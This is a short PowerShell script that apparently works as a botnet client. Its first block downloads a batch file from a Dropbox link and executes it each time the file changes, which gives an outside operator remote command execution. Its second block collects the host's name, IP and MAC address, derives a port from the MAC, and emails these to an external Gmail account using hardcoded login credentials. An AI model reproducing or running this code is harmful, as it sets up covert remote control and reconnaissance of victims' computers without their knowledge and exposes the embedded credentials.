###############################################################################################
#This block downloads "commands.bat" and executes it if there have been any updates to the file
###############################################################################################

$path = Convert-Path .
$path2 = "$($path)\prev"

If(!(test-path $path))
{
New-Item -ItemType Directory -Force -Path $path
}
If(!(Test-Path $path2))
{
New-Item -ItemType Directory -Force -Path $path2
}

If(test-path "$($path)\commands.bat")
{
Copy-Item "$($path)\commands.bat" "$($path)\prev"
}
Else{
    New-Item "$($path)\prev\commands.bat" -type file -force -value "garbage"

}


Invoke-WebRequest -Uri "https://www.dropbox.com/s/jqerw6bol6l9n9t/cmds.bat?dl=1" -OutFile "$($path)\commands.bat"

$A="$($path)\commands.bat"
$B="$($path2)\commands.bat"
$C=diff (cat $A) (cat $B)

If($C)
{
Start-Process cmd -ArgumentList "/c commands.bat" -WorkingDirectory "$($path)"
}

###############################################################################################
#This block sends host information to the server to be inserted into the database
###############################################################################################

$hostname = hostname
$ipV4 = Test-Connection -ComputerName (hostname) -Count 1  | Select IPV4Address
$ip = $ipV4.ipv4address.IPAddressToString
$mactemp = Get-CimInstance win32_networkadapterconfiguration | select description, macaddress | where {$_.MACAddress -ne $null } | where {$_.Description -match "Ethernet" } | where {$_.Description -NotMatch "vmware" }
$mac = $mactemp[0].macaddress

$port = 0;
$tempVal = [convert]::toint32("$($mac[0])$($mac[1])",16)
$port= $port+$tempval
$tempVal = [convert]::toint32("$($mac[3])$($mac[4])",16)
$port= $port+$tempval
$tempVal = [convert]::toint32("$($mac[6])$($mac[7])",16)
$port= $port+$tempval
$tempVal = [convert]::toint32("$($mac[9])$($mac[10])",16)
$port= $port+$tempval
$tempVal = [convert]::toint32("$($mac[12])$($mac[13])",16)
$port= $port+$tempval
$tempVal = [convert]::toint32("$($mac[15])$($mac[16])",16)
$port= $port+$tempval

$From = "botmenow6969@gmail.com"
$To = "passthepass69@gmail.com"
$SMTPServer = "smtp.gmail.com"
$SMTPPort = "587"
$Username = "botmenow6969@gmail.com"
$Password = "weebhouse"
$subject = "ip-mac-port"
$body = "IP:$($ip) MAC:$($mac) port:$($port) hostname: *$($hostname)*"

$smtp = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort);

$smtp.EnableSSL = $true
$smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
$smtp.Send($From, $To, $subject, $body);
